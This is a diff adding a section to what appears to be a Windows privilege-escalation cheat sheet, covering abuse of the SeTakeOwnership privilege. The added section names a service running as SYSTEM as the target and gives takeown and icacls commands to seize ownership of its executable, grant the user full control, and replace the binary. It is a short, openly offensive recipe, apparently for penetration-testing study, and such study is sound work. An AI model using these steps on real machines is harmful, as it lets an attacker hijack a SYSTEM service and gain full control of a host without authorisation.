@@ -97,6 +97,13 @@ The SeBackup and SeRestore privileges allow users to read and write to any file 
 
 
 ## SeTakeOwnership:	
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys. search for a service running as SYSTEM and take ownership of the service's executable.Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need
+```ps1
+# take the executable ownership whit this:
+takeown /f C:\Windows\System32\SomeThing.exe
+# give your user full permissions, After this, we will replace the Binary:
+icacls C:\Windows\System32\SomeThing.exe /grant <Username>:F
+```
 
 ## SeImpersonate / SeAssignPrimaryToken:
 
